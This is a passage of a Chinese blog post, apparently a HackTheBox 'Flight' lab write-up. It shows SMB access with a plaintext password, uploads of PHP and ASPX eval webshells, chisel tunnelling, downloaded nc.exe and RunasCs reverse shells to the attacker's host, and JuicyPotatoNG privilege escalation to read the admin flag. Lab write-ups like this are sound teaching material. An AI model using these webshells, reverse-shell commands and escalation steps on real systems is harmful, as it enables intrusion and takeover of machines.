+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.11.187 -u c.bum -p Tikkycoll_431012284</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[+] IP: 10.10.11.187:445	Name: 10.10.11.187</span><br><span class="line">    Disk                                                Permissions		Comment</span><br><span class="line">	----                                                -----------		-------</span><br><span class="line">	ADMIN$                                            	NO ACCESS		Remote Admin</span><br><span class="line">	C$                                                	NO ACCESS		Default share</span><br><span class="line">	IPC$                                              	READ ONLY		Remote IPC</span><br><span class="line">	NETLOGON                                          	READ ONLY		Logon server share </span><br><span class="line">	Shared                                            	READ, WRITE	</span><br><span class="line">	SYSVOL                                            	READ ONLY		Logon server share </span><br><span class="line">	Users                                             	READ ONLY	</span><br><span class="line">	Web                                               	READ, WRITE</span><br></pre></td></tr></table></figure>
+<p><s>嗨呀，psexec</s></p>
+<p>与之前一样的原因，写入Shared无法反弹Shell<br />
+本来想试着写入Web的，结果psexec是按顺序尝试写入分享路径，在分享路径Shared尝试失败后就推出了<br />
+整了半天不知道怎么指定分享路径Web，只能写Webshell了</p>
+<p>Weevely的create_function()不被php8所支持导致Webshell不可用<br />
+apt-get升级跟github下载项目都不行<br />
+大概看了一眼issue<br />
+作者说create_function是在内存中运行的，其他的函数都没有这个效果<br />
+然后好像就摆烂了？<br />
+没办法，上蚁剑吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;BFL&quot;]);?&gt;&#x27;</span> &gt; BFL.php</span><br><span class="line">smbclient //10.10.11.187/web -U c.bum --password=Tikkycoll_431012284</span><br><span class="line"><span class="built_in">cd</span> school.flight.htb</span><br><span class="line">put BFL.php</span><br></pre></td></tr></table></figure>
+<p>监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9998</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RunasCs/">https://github.com/antonioCoco/RunasCs/</a></p>
+</blockquote>
+<p>使用蚁剑上传runascs后运行</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runascs.exe c.bum Tikkycoll_431012284 powershell -r <span class="number">10</span>.<span class="number">10</span>.*.*:<span class="number">9998</span></span><br></pre></td></tr></table></figure>
+<p>查看user.txt</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> /users/c.bum/desktop/user.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">970e7b5b8f6e538ede217e98f6e33832</span><br></pre></td></tr></table></figure>
+<h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2>
+<p>收集系统信息</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Host Name:                 G0</span><br><span class="line">OS Name:                   Microsoft Windows Server 2019 Standard</span><br><span class="line">OS Version:                10.0.17763 N&#x2F;A Build 17763</span><br><span class="line">OS Manufacturer:           Microsoft Corporation</span><br><span class="line">OS Configuration:          Primary Domain Controller</span><br><span class="line">OS Build Type:             Multiprocessor Free</span><br><span class="line">Registered Owner:          Windows User</span><br><span class="line">Registered Organization:   </span><br><span class="line">Product ID:                00429-00521-62775-AA402</span><br><span class="line">Original Install Date:     7&#x2F;20&#x2F;2021, 11:21:49 AM</span><br><span class="line">System Boot Time:          3&#x2F;10&#x2F;2023, 7:46:45 AM</span><br><span class="line">System Manufacturer:       VMware, Inc.</span><br><span class="line">System Model:              VMware7,1</span><br><span class="line">System Type:               x64-based PC</span><br><span class="line">Processor(s):              2 Processor(s) Installed.</span><br><span class="line">                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz</span><br><span class="line">                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz</span><br><span class="line">BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8&#x2F;7&#x2F;2020</span><br><span class="line">Windows Directory:         C:\Windows</span><br><span class="line">System Directory:          C:\Windows\system32</span><br><span class="line">Boot Device:               \Device\HarddiskVolume3</span><br><span class="line">System Locale:             en-us;English (United States)</span><br><span class="line">Input Locale:              it;Italian (Italy)</span><br><span class="line">Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)</span><br><span class="line">Total Physical Memory:     4,095 MB</span><br><span class="line">Available Physical Memory: 2,046 MB</span><br><span class="line">Virtual Memory: Max Size:  5,503 MB</span><br><span class="line">Virtual Memory: Available: 3,361 MB</span><br><span class="line">Virtual Memory: In Use:    2,142 MB</span><br><span class="line">Page File Location(s):     C:\pagefile.sys</span><br><span class="line">Domain:                    flight.htb</span><br><span class="line">Logon Server:              N&#x2F;A</span><br><span class="line">Hotfix(s):                 N&#x2F;A</span><br><span class="line">Network Card(s):           1 NIC(s) Installed.</span><br><span class="line">                           [01]: vmxnet3 Ethernet Adapter</span><br><span class="line">                                 Connection Name: Ethernet0 2</span><br><span class="line">                                 DHCP Enabled:    No</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 10.10.11.187</span><br><span class="line">                                 [02]: fe80::c88d:96af:ef3d:fb9f</span><br><span class="line">                                 [03]: dead:beef::c88d:96af:ef3d:fb9f</span><br><span class="line">                                 [04]: dead:beef::250</span><br><span class="line">Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.</span><br></pre></td></tr></table></figure>
+<p>查看TCP监听端口</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ant | <span class="built_in">findstr</span> TCP | <span class="built_in">findstr</span> <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49690          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49693          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49702          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    10.10.11.187:53        0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    10.10.11.187:139       0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       InHost</span><br></pre></td></tr></table></figure>
+<p>与nmap扫描结果对比好像多了个8000？</p>
+<p>本机上测试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I -v http://10.10.11.187:8000/</span><br></pre></td></tr></table></figure>
+<p>没有响应</p>
+<p>靶机上测试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://0.0.0.0:8000/</span><br><span class="line">curl : Unable to connect to the remote server</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:8000/</span><br><span class="line">curl : &lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;</span>&gt; </span><br></pre></td></tr></table></figure>
+<p>估计是要做个端口转发了</p>
+<p><s>用LCX搭端口转发死活搭不上，麻了</s></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></p>
+</blockquote>
+<p>本机运行服务端，开启HTTP服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./chisel_1.8.1_linux_amd64 server -p 8888 --reverse &amp;</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
+<p>下载并运行客户端</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WebRequest -Uri &quot;http://<span class="number">10</span>.<span class="number">10</span>.*.*/chisel_1.<span class="number">8</span>.<span class="number">1</span>_windows_amd64&quot; -OutFile &quot;./chisel.exe&quot;</span><br><span class="line">./chisel.exe client <span class="number">10</span>.<span class="number">10</span>.*.*:<span class="number">8888</span> R:<span class="number">8000</span>:<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8000</span></span><br></pre></td></tr></table></figure>
+<p>将客户端的127.0.0.1:8000转发至服务端0.0.0.0:8000</p>
+<p>访问<code>http://0.0.0.0:8000/</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Physical Path	   C:\inetpub\development</span><br></pre></td></tr></table></figure>
+<p>IIS服务，得到路径</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> c:\inetpub\development</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    Directory: C:\inetpub\development</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----        3&#x2F;11&#x2F;2023  12:52 PM                development </span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> C:\inetpub\development\development</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    Directory: C:\inetpub\development\development</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----        3&#x2F;11&#x2F;2023  12:52 PM                css</span><br><span class="line">d-----        3&#x2F;11&#x2F;2023  12:52 PM                fonts</span><br><span class="line">d-----        3&#x2F;11&#x2F;2023  12:52 PM                img</span><br><span class="line">d-----        3&#x2F;11&#x2F;2023  12:52 PM                js</span><br><span class="line">-a----        4&#x2F;16&#x2F;2018   2:23 PM           9371 contact.html</span><br><span class="line">-a----        4&#x2F;16&#x2F;2018   2:23 PM          45949 index.html</span><br></pre></td></tr></table></figure>
+<p>尝试了以下，对路径有写权限</p>
+<p>写入aspx WebShell</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Content -<span class="built_in">Path</span> &quot;C:\inetpub\development\development\BFL.aspx&quot; -Value &#x27;&lt;%@ Page Language=&quot;Jscript&quot;<span class="variable">%&gt;&lt;%</span>eval(Request.Item[&quot;BFL&quot;],&quot;unsafe&quot;);%&gt;&#x27;</span><br></pre></td></tr></table></figure>
+<p>蚁剑连接后上传nc.exe</p>
+<p><s>一开始找个nc不支持-e选项，笑嘻了</s></p>
+<p>监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9997</span><br></pre></td></tr></table></figure>
+<p>反弹Shell</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cmd</span> /c <span class="built_in">start</span> nc.exe -e <span class="built_in">cmd</span> <span class="number">10</span>.<span class="number">10</span>.<span class="number">16</span>.<span class="number">12</span> <span class="number">9997</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                               State   </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled</span><br><span class="line">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain                Disabled</span><br><span class="line">SeAuditPrivilege              Generate security audits                  Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled </span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled </span><br><span class="line">SeCreateGlobalPrivilege       Create global objects                     Enabled </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</span><br></pre></td></tr></table></figure>
+<p><code>SeImpersonatePrivilege</code>，一眼juicypotato</p>
+<p>老的juicypotato好像对<code>Microsoft Windows Server 2019 Standard</code>无效</p>
+<p>下载JuicyPotatoNG，解压并开启http服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip</span><br><span class="line">unzip JuicyPotatoNG.zip</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
+<p>监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9995</span><br></pre></td></tr></table></figure>
+<p>下载JuicyPotatoNG.exe和nc.exe，运行juicypotatong</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line">Invoke-WebRequest -Uri &quot;http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">16</span>.<span class="number">12</span>/JuicyPotatoNG.exe&quot; -OutFile &quot;./JuicyPotatoNG.exe&quot;</span><br><span class="line">Invoke-WebRequest -Uri &quot;http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">16</span>.<span class="number">12</span>/nc.exe&quot; -OutFile &quot;./nc.exe&quot;</span><br><span class="line">./juicypotatoNG.exe -t t -p &quot;./nc.exe&quot; -a &quot;-e <span class="built_in">cmd</span> <span class="number">10</span>.<span class="number">10</span>.*.* <span class="number">9995</span></span><br></pre></td></tr></table></figure>
+<p>获得反弹shell，查看root.txt</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f54fcef08f4ea67c6c7b406b2170b354</span><br></pre></td></tr></table></figure>
+<hr />
+<blockquote>
+<p>端口转发工具</p>
+</blockquote>
+<p>之前的lcx工具弄丢了，现在找的交叉编译跟Windows环境编译都能通过，但是都用不了</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/windworst/LCX">https://github.com/windworst/LCX</a><br />
+<a target="_blank" rel="noopener" href="https://github.com/AA8j/SecTools/raw/main/lcx/lcx.exe">https://github.com/AA8j/SecTools/raw/main/lcx/lcx.exe</a></p>
+</blockquote>
+<p>搞半天连不通<br />
+网上找下第一个编译成elf第二个直接用还能连上，就这样吧</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>xXxYOLOxXx
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://yoloyolo.top/2023/03/12/HackTheBox-Flight/" title="HackTheBox_Flight">https://yoloyolo.top/2023/03/12/HackTheBox-Flight/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Pentest/" rel="tag"># Pentest</a>
+              <a href="/tags/HackTheBox/" rel="tag"># HackTheBox</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/09/HackTheBox-Escape/" rel="prev" title="HackTheBox_Escape">
+      <i class="fa fa-chevron-left"></i> HackTheBox_Escape
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#hackthebox_flight"><span class="nav-number">1.</span> <span class="nav-text"> HackTheBox_Flight</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text"> 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.1.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%AF%E5%BE%84%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.1.2.</span> <span class="nav-text"> 路径枚举</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vhost"><span class="nav-number">1.1.3.</span> <span class="nav-text"> VHOST</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">1.3.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">xXxYOLOxXx</p>
+  <div class="site-description" itemprop="description">Explorer for unknown.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">56</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">51</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/monster414" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;monster414" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yolo-yolo@qq.com" title="E-Mail → mailto:yolo-yolo@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://music.163.com/#/user/home?id=302397927" title="CloudMisuc → https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;302397927" rel="noopener" target="_blank"><i class=" fa-fw"></i>CloudMisuc</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://steamcommunity.com/id/Purple_Miracle/" title="Steam → https:&#x2F;&#x2F;steamcommunity.com&#x2F;id&#x2F;Purple_Miracle&#x2F;" rel="noopener" target="_blank"><i class=" fa-fw"></i>Steam</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://yoloyolo.top/atom.xml" title="RSS → https:&#x2F;&#x2F;yoloyolo.top&#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xXxYOLOxXx</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
